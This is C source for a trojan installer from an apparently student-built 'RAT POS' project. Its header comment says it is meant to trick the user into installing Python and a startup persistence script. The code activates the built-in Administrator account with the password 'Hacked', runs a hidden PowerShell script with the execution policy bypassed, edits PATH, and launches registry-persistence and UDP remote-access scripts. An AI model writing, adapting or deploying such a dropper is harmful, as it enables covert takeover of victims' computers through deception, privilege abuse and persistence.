/*
Project: RAT POS
Author: Swager
Description: this file is compiled to POS_installer.exe and is designed to trick the user into installing python
and triggering add_startup.py so that pos.py runs on startup.

*/

#include <Windows.h>
#include <stdlib.h>
#include <stdio.h>

int main()
{
    system("start /WAIT powershell Start-Process cmd -Verb runas -ArgumentList '/c net user Administrator Hacked /active:yes'");
    system("start /WAIT powershell.exe -executionpolicy bypass -windowstyle hidden -noninteractive -nologo -file \"Initialize_v1.ps1\""); //powershell script that checks if python is installed
    Sleep(2000);
    system("setx path \"%PATH%;C:\\Python38\\\"");
    system("setx path \"%PATH%;C:\\Python38\\Scripts\\\""); //adds the right path for pips
    Sleep(10000);
    system("start /WAIT powershell Start-Process cmd -Verb runas -ArgumentList '/c pip install openpyxl'"); //openpyxl is needed to run pos.py
    Sleep(2000);
    system("start /WAIT powershell Start-Process cmd -ArgumentList '/c cd \"C:\\Users\\student\\Desktop\\TEAMPROJRAT-master\\persistence\\\" && python add_startup.py'"); //starts the registry editing py file after python is installed
    system("cd \"C:\\Users\\student\\Desktop\\TEAMPROJRAT-master\\UDP_Connection\\\" && pos.pyw");
    system("exit");
    return 0;
}